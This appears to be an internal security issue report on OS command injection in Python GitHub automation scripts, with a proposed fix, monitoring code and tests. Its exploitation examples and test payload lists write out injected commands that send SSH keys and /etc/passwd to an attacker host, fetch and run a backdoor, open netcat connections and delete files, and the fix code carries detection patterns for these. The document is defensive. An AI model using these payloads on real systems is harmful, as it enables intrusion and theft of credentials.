# Security Issue #34: OS Command Injection in Development Tools

## Problem Classification
- **Type**: Security
- **Category**: Security/Development Tools
- **Impact**: High (Security vulnerability)
- **Urgency**: High (Security risk)
- **Severity**: Major
- **CVSS Score**: 7.8 (High)
- **CWE**: CWE-78 (OS Command Injection)

## Executive Summary

**Business Impact**: Development tools contain OS command injection vulnerabilities that could allow arbitrary code execution if exploited. While limited to development environment, this poses significant risks to developer workstations and could potentially compromise source code, development infrastructure, or enable supply chain attacks targeting the application's users.

**Financial Impact**: Potential $5,000-25,000 impact from compromised development environment, intellectual property theft, or supply chain attacks. Risk of development workflow disruption, security incident response costs, regulatory compliance issues, and potential legal liability if customer data is accessed through compromised development systems.

**Strategic Risk**: Security vulnerabilities in development tools can be stepping stones for sophisticated attacks, potentially compromising the entire development pipeline, source code integrity, customer trust, and competitive advantage. Could enable advanced persistent threats (APTs) targeting the organization's intellectual property and customer data.

## General Summary

**Problem Overview**: Development automation tools use `subprocess.run()` with `shell=True` without proper input sanitization, creating command injection vulnerabilities. Attackers could potentially execute arbitrary commands on developer machines through malicious input in project names, repository URLs, or other parameters, leading to complete system compromise.

**User Impact**: 
- Developers using these tools could unknowingly execute malicious commands
- Development environment security could be completely compromised
- Potential for supply chain attacks through compromised development tools
- Risk of malware installation, data exfiltration, or credential theft from developer machines
- Possible compromise of source code repositories and development credentials
- Loss of intellectual property and sensitive customer data

**Business Context**: While these are development tools, security vulnerabilities in the development pipeline can have catastrophic consequences including source code theft, backdoor insertion, development infrastructure compromise, regulatory violations, and complete loss of customer trust and business reputation.

## Technical Summary

### Root Cause Analysis

**Primary Cause**: Use of `subprocess.run()` with `shell=True` parameter without proper input validation and sanitization, allowing shell metacharacter injection and arbitrary command execution.

**Technical Details**:
```python
# Vulnerable code locations
# tools/github/create_github_project_maximum_automation.py (Line 15-16)
subprocess.run(f"git clone {repo_url}", shell=True)

# tools/github/create_github_project_v2.py (Line 13-14)  
subprocess.run(f"gh repo create {project_name}", shell=True)
```

**Contributing Factors**:
1. Direct string interpolation in shell commands without escaping
2. No input validation or sanitization mechanisms
3. Use of shell=True enabling shell metacharacter interpretation
4. Missing allowlist validation for commands and parameters
5. No timeout or resource limits on command execution
6. Lack of security-focused code review processes
7. Missing security testing in CI/CD pipeline

**Attack Vectors**:
1. **Command Injection**: Malicious input in project names or URLs
2. **Shell Metacharacter Exploitation**: Using `;`, `&&`, `||`, `|` to chain commands
3. **Environment Variable Manipulation**: Exploiting shell variable expansion
4. **Path Traversal**: Manipulating file paths in commands
5. **Code Injection**: Injecting malicious code through parameters
6. **Privilege Escalation**: Exploiting elevated permissions

**Example Exploitation Scenarios**:
```bash
# Malicious project name - Data exfiltration
project_name = "test; curl -X POST https://attacker.com/data -d @~/.ssh/id_rsa"

# Malicious repository URL - Backdoor installation  
repo_url = "https://github.com/user/repo.git; wget https://attacker.com/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh"

# Environment variable exploitation
project_name = "test; export MALICIOUS_VAR=$(cat /etc/passwd); curl https://attacker.com/exfil?data=$MALICIOUS_VAR"

# Privilege escalation attempt
repo_url = "https://github.com/user/repo.git; sudo -n whoami && echo 'ELEVATED_ACCESS' || echo 'LIMITED_ACCESS'"
```

**Security Impact Assessment**:
- **Confidentiality**: HIGH - Access to source code, credentials, and sensitive data
- **Integrity**: HIGH - Ability to modify code, inject backdoors, and alter system files
- **Availability**: MEDIUM - Potential for system disruption and denial of service

### Suggested Resolution

**Immediate Security Fix (1 day)**:
```python
# Secure implementation without shell=True
import subprocess
import shlex
import re
import logging
from pathlib import Path
from typing import List, Optional
from urllib.parse import urlparse

# Security-focused logging
security_logger = logging.getLogger('security.commands')

def safe_git_clone(repo_url: str, target_dir: str) -> bool:
    """Safely clone a git repository with comprehensive security validation."""
    
    # Input validation with security focus
    if not is_valid_git_url(repo_url):
        security_logger.warning(f"Invalid git URL rejected: {repo_url}")
        raise SecurityError("Invalid git repository URL - potential security risk")
    
    if not is_safe_directory_name(target_dir):
        security_logger.warning(f"Unsafe directory name rejected: {target_dir}")
        raise SecurityError("Invalid target directory name - potential security risk")
    
    # Additional security checks
    if contains_suspicious_patterns(repo_url) or contains_suspicious_patterns(target_dir):
        security_logger.error(f"Suspicious patterns detected in input: {repo_url}, {target_dir}")
        raise SecurityError("Suspicious patterns detected - potential attack attempt")
    
    # Use argument list instead of shell command
    try:
        # Log security event
        security_logger.info(f"Executing secure git clone: {repo_url} -> {target_dir}")
        
        result = subprocess.run([
            'git', 'clone', 
            '--depth', '1',  # Limit clone depth for security
            '--single-branch',  # Only clone single branch
            repo_url, target_dir
        ], 
        capture_output=True, 
        text=True, 
        timeout=300,  # 5 minute timeout
        check=True,
        env=get_secure_environment()  # Sanitized environment
        )
        
        security_logger.info(f"Git clone completed successfully: {target_dir}")
        return True
        
    except subprocess.CalledProcessError as e:
        security_logger.error(f"Git clone failed: {e.stderr}")
        return False
    except subprocess.TimeoutExpired:
        security_logger.error(f"Git clone timed out for: {repo_url}")
        return False

def safe_github_create(project_name: str, description: str = "", visibility: str = "private") -> bool:
    """Safely create GitHub repository with security controls."""
    
    # Comprehensive input validation
    if not is_valid_project_name(project_name):
        security_logger.warning(f"Invalid project name rejected: {project_name}")
        raise SecurityError("Invalid project name - potential security risk")
    
    # Sanitize and validate description
    description = sanitize_description(description)
    if len(description) > 500:
        security_logger.warning(f"Description too long, truncated: {len(description)} chars")
        description = description[:500]
    
    # Validate visibility setting
    if visibility not in ['private', 'public', 'internal']:
        security_logger.warning(f"Invalid visibility setting: {visibility}")
        visibility = 'private'  # Default to most secure option
    
    # Build secure command
    cmd = ['gh', 'repo', 'create', project_name, f'--{visibility}']
    if description:
        cmd.extend(['--description', description])
    
    try:
        security_logger.info(f"Creating GitHub repository: {project_name}")
        
        result = subprocess.run(cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=60,
                              check=True,
                              env=get_secure_environment())
        
        security_logger.info(f"GitHub repository created successfully: {project_name}")
        return True
        
    except subprocess.CalledProcessError as e:
        security_logger.error(f"GitHub repo creation failed: {e.stderr}")
        return False

# Enhanced security validation functions
def is_valid_git_url(url: str) -> bool:
    """Validate git repository URL with comprehensive security checks."""
    try:
        parsed = urlparse(url)
        
        # Only allow HTTPS and SSH protocols from trusted domains
        if parsed.scheme not in ['https', 'ssh']:
            return False
        
        # Allowlist of trusted Git hosting providers
        trusted_domains = [
            'github.com', 'gitlab.com', 'bitbucket.org',
            'dev.azure.com', 'sourceforge.net'
        ]
        
        if not any(domain in parsed.netloc for domain in trusted_domains):
            return False
        
        # Validate URL structure
        patterns = [
            r'^https://(github\.com|gitlab\.com|bitbucket\.org)/[\w\-\.]+/[\w\-\.]+\.git$',
            r'^git@(github\.com|gitlab\.com|bitbucket\.org):[\w\-\.]+/[\w\-\.]+\.git$'
        ]
        
        return any(re.match(pattern, url) for pattern in patterns)
        
    except Exception:
        return False

def is_valid_project_name(name: str) -> bool:
    """Validate project name with security-focused rules."""
    if not name or len(name) > 100 or len(name) < 1:
        return False
    
    # Only allow alphanumeric, hyphens, underscores, dots
    if not re.match(r'^[a-zA-Z0-9\-_\.]+$', name):
        return False
    
    # Prevent reserved names and suspicious patterns
    reserved_names = ['con', 'prn', 'aux', 'nul', 'admin', 'root', 'system']
    if name.lower() in reserved_names:
        return False
    
    return True

def sanitize_description(description: str) -> str:
    """Sanitize project description with security focus."""
    if not description:
        return ""
    
    # Remove potentially dangerous characters and patterns
    # Allow only safe characters for descriptions
    sanitized = re.sub(r'[^\w\s\-\.\,\!\?\(\)\[\]]', '', description)
    
    # Remove potential script injection patterns
    dangerous_patterns = [
        r'<script.*?</script>',
        r'javascript:',
        r'data:',
        r'vbscript:',
        r'on\w+\s*=',
    ]
    
    for pattern in dangerous_patterns:
        sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
    
    return sanitized.strip()

def is_safe_directory_name(name: str) -> bool:
    """Validate directory name with comprehensive security checks."""
    if not name or len(name) > 255:
        return False
    
    # Prevent directory traversal and dangerous patterns
    dangerous_patterns = [
        r'\.\.', r'^\/', r'^\\', r'^~', r'^\$',
        r'[`$;|&<>]', r'^\-', r'\s$', r'^\s'
    ]
    
    if any(re.search(pattern, name) for pattern in dangerous_patterns):
        return False
    
    # Only allow safe characters
    if not re.match(r'^[a-zA-Z0-9\-_\.]+$', name):
        return False
    
    # Prevent reserved directory names
    reserved_names = ['con', 'prn', 'aux', 'nul', 'com1', 'lpt1']
    if name.lower() in reserved_names:
        return False
    
    return True

def contains_suspicious_patterns(input_str: str) -> bool:
    """Detect suspicious patterns that might indicate attack attempts."""
    suspicious_patterns = [
        r'[;&|`$()]',  # Shell metacharacters
        r'\.\./',      # Directory traversal
        r'rm\s+-rf',   # Dangerous commands
        r'curl.*\|',   # Command chaining
        r'wget.*&&',   # Command chaining
        r'nc\s+\d+',   # Netcat usage
        r'bash\s+-c',  # Bash execution
        r'eval\s*\(',  # Code evaluation
        r'exec\s*\(',  # Code execution
    ]
    
    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in suspicious_patterns)

def get_secure_environment() -> dict:
    """Get sanitized environment variables for secure command execution."""
    import os
    
    # Only pass through essential and safe environment variables
    safe_env_vars = [
        'PATH', 'HOME', 'USER', 'LANG', 'LC_ALL', 'TERM',
        'GITHUB_TOKEN', 'GH_TOKEN'  # GitHub CLI authentication
    ]
    
    secure_env = {}
    for var in safe_env_vars:
        if var in os.environ:
            # Additional validation for sensitive variables
            if var in ['GITHUB_TOKEN', 'GH_TOKEN']:
                token = os.environ[var]
                if is_valid_github_token(token):
                    secure_env[var] = token
            else:
                secure_env[var] = os.environ[var]
    
    return secure_env

def is_valid_github_token(token: str) -> bool:
    """Validate GitHub token format."""
    if not token:
        return False
    
    # GitHub token patterns
    patterns = [
        r'^ghp_[a-zA-Z0-9]{36}$',  # Personal access token
        r'^gho_[a-zA-Z0-9]{36}$',  # OAuth token
        r'^ghu_[a-zA-Z0-9]{36}$',  # User-to-server token
    ]
    
    return any(re.match(pattern, token) for pattern in patterns)

class SecurityError(Exception):
    """Security-related error in command execution."""
    pass
```

**Long-term Solution (3-4 days)**:
1. **Secure Command Execution Framework**: Centralized secure command execution with comprehensive logging
2. **Input Validation Library**: Comprehensive validation for all user inputs with security focus
3. **Command Allowlist System**: Restrict executable commands to approved list with security review
4. **Security Audit Logging**: Complete audit trail for all command executions
5. **Automated Security Testing**: Integration with security testing tools and SAST scanners

**Alternative Approaches**:
- **Option 1**: Use Python libraries instead of shell commands where possible (e.g., GitPython)
- **Option 2**: Containerized execution environment for complete isolation
- **Option 3**: Web-based tools with proper authentication and authorization

### Monitoring and Alerting

**Security Event Monitoring**:
```python
# Comprehensive security monitoring for command execution
class SecurityCommandMonitor:
    def __init__(self):
        self.logger = logging.getLogger('security.monitor')
        self.alert_threshold = 3  # Alert after 3 suspicious events
        self.suspicious_events = {}
        
    def log_command_execution(self, command: List[str], user: str, result: subprocess.CompletedProcess, 
                            source_ip: str = None, session_id: str = None):
        """Log command execution with comprehensive security context."""
        
        security_event = {
            'timestamp': datetime.utcnow().isoformat(),
            'event_type': 'command_execution',
            'user': user,
            'command': command[0],
            'args': command[1:],
            'exit_code': result.returncode,
            'working_dir': str(Path.cwd()),
            'duration': getattr(result, 'duration', None),
            'source_ip': source_ip,
            'session_id': session_id,
            'process_id': os.getpid(),
            'parent_process_id': os.getppid()
        }
        
        self.logger.info(json.dumps(security_event))
        
        # Analyze for suspicious patterns
        if self._is_suspicious_command(command, result):
            self._handle_suspicious_activity(security_event)
    
    def _is_suspicious_command(self, command: List[str], result: subprocess.CompletedProcess) -> bool:
        """Enhanced suspicious command detection."""
        full_command = ' '.join(command)
        
        # High-risk command patterns
        high_risk_patterns = [
            r'rm\s+-rf\s+/',
            r'chmod\s+777',
            r'curl.*\|\s*sh',
            r'wget.*\|\s*sh',
            r'nc\s+.*\s+\d+',
            r'bash\s+-c',
            r'eval\s*\(',
            r'exec\s*\(',
            r'sudo\s+',
            r'/etc/passwd',
            r'/etc/shadow'
        ]
        
        # Check for suspicious patterns
        for pattern in high_risk_patterns:
            if re.search(pattern, full_command, re.IGNORECASE):
                return True
        
        # Check for unusual exit codes
        if result.returncode not in [0, 1, 2]:
            return True
        
        # Check for excessive resource usage
        if hasattr(result, 'duration') and result.duration > 300:  # 5 minutes
            return True
        
        return False
    
    def _handle_suspicious_activity(self, security_event: dict):
        """Handle detected suspicious activity."""
        user = security_event['user']
        
        # Track suspicious events per user
        if user not in self.suspicious_events:
            self.suspicious_events[user] = []
        
        self.suspicious_events[user].append(security_event)
        
        # Alert if threshold exceeded
        if len(self.suspicious_events[user]) >= self.alert_threshold:
            self._send_security_alert(user, self.suspicious_events[user])
    
    def _send_security_alert(self, user: str, events: List[dict]):
        """Send security alert for suspicious activity."""
        alert = {
            'type': 'suspicious_command_activity',
            'severity': 'high',
            'user': user,
            'event_count': len(events),
            'events': events,
            'timestamp': datetime.utcnow().isoformat(),
            'recommended_action': 'Investigate user activity and potentially disable account'
        }
        
        # Send to security team
        self.logger.critical(f"SECURITY ALERT: {json.dumps(alert)}")
        
        # Integration with security tools (SIEM, etc.)
        self._integrate_with_siem(alert)
    
    def _integrate_with_siem(self, alert: dict):
        """Integrate with SIEM or security monitoring tools."""
        # Implementation would integrate with tools like Splunk, ELK, etc.
        pass
```

**Error Tracking**:
- Command execution failure monitoring with security context
- Security violation attempt tracking and correlation
- Performance impact assessment of security controls
- User behavior analysis and anomaly detection

**Health Checks**:
- Input validation effectiveness monitoring
- Command execution success rates with security controls
- Security policy compliance verification
- Threat detection system performance monitoring

### Testing Strategy

**Unit Tests**:
```python
import pytest
from unittest.mock import patch, MagicMock

class TestSecureCommandExecution:
    def test_prevents_command_injection_basic(self):
        """Test basic command injection prevention."""
        with pytest.raises(SecurityError):
            safe_git_clone('repo; rm -rf /', 'target')
    
    def test_prevents_advanced_command_injection(self):
        """Test advanced command injection prevention."""
        malicious_inputs = [
            'repo && curl attacker.com/steal.sh | sh',
            'repo || wget malicious.com/backdoor',
            'repo; export EVIL=$(cat /etc/passwd)',
            'repo`whoami`',
            'repo$(id)',
            'repo | nc attacker.com 4444'
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                safe_git_clone(f'https://github.com/user/{malicious_input}.git', 'target')
    
    def test_validates_trusted_domains_only(self):
        """Test that only trusted domains are allowed."""
        untrusted_urls = [
            'https://malicious.com/repo.git',
            'https://evil-github.com/user/repo.git',
            'ftp://github.com/user/repo.git',
            'http://github.com/user/repo.git'  # HTTP not allowed
        ]
        
        for url in untrusted_urls:
            assert not is_valid_git_url(url)
    
    def test_environment_sanitization(self):
        """Test environment variable sanitization."""
        env = get_secure_environment()
        
        # Should only contain safe variables
        safe_vars = ['PATH', 'HOME', 'USER', 'LANG', 'LC_ALL', 'TERM', 'GITHUB_TOKEN', 'GH_TOKEN']
        for var in env.keys():
            assert var in safe_vars
    
    @patch('subprocess.run')
    def test_secure_execution_parameters(self, mock_run):
        """Test that secure execution uses proper parameters."""
        mock_run.return_value = MagicMock(returncode=0)
        
        safe_git_clone('https://github.com/user/repo.git', 'target')
        
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        
        # Verify security parameters
        assert 'shell' not in kwargs or kwargs['shell'] is False
        assert 'timeout' in kwargs
        assert kwargs['timeout'] <= 300
        assert 'env' in kwargs
        assert args[0][0] == 'git'
```

**Security Testing**:
```python
class SecurityPenetrationTests:
    def test_command_injection_vectors(self):
        """Test comprehensive command injection attack vectors."""
        injection_payloads = [
            '; rm -rf /',
            '&& curl malicious.com/script.sh | sh',
            '|| wget -O- malicious.com/payload',
            '`whoami`',
            '$(id)',
            '| nc attacker.com 4444',
            '; cat /etc/passwd',
            '&& sudo -n whoami',
            '|| chmod 777 /',
            '; export MALICIOUS_VAR=evil'
        ]
        
        for payload in injection_payloads:
            with pytest.raises(SecurityError):
                safe_git_clone(f'https://github.com/user/repo{payload}.git', 'target')
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/shadow',
            '~/.ssh/id_rsa',
            '$HOME/.bashrc'
        ]
        
        for payload in traversal_payloads:
            with pytest.raises(SecurityError):
                safe_git_clone('https://github.com/user/repo.git', payload)
    
    def test_environment_variable_injection(self):
        """Test environment variable injection prevention."""
        env_payloads = [
            'test; export MALICIOUS=$(cat /etc/passwd)',
            'test && export EVIL_VAR=malicious',
            'test || export BACKDOOR=active'
        ]
        
        for payload in env_payloads:
            with pytest.raises(SecurityError):
                safe_github_create(payload)
```

### Implementation Timeline

**Phase 1 (Day 1)**: Emergency security fixes - Replace shell=True with secure implementations and add comprehensive input validation
**Phase 2 (Day 2)**: Implement security monitoring, audit logging, and threat detection systems
**Phase 3 (Day 3)**: Add automated security testing, SAST integration, and security policy enforcement
**Phase 4 (Day 4)**: Security review, penetration testing, documentation, and team security training

### Success Criteria

**Technical Metrics**:
- [ ] All subprocess calls use shell=False or secure argument lists
- [ ] Input validation prevents 100% of command injection attempts
- [ ] Command execution is comprehensively logged and monitored
- [ ] Security tests pass with 100% coverage of attack vectors
- [ ] No shell metacharacters accepted in any inputs
- [ ] Command allowlist properly restricts execution to approved commands
- [ ] SAST tools report zero command injection vulnerabilities

**Business Metrics**:
- [ ] Zero security incidents related to command injection
- [ ] Development workflow maintains current efficiency with security controls
- [ ] Security compliance requirements met (SOC 2, ISO 27001)
- [ ] Developer security training completed with 100% participation
- [ ] Security audit findings resolved

**Quality Metrics**:
- [ ] Comprehensive audit trail captures all command executions with security context
- [ ] Security monitoring detects and alerts on 100% of suspicious activity
- [ ] Code review process includes mandatory security validation
- [ ] Automated security testing integrated into CI/CD pipeline
- [ ] Incident response procedures tested and validated

---

**Priority**: High - Critical security vulnerability in development tools requiring immediate attention to prevent potential exploitation and protect development infrastructure from sophisticated attacks.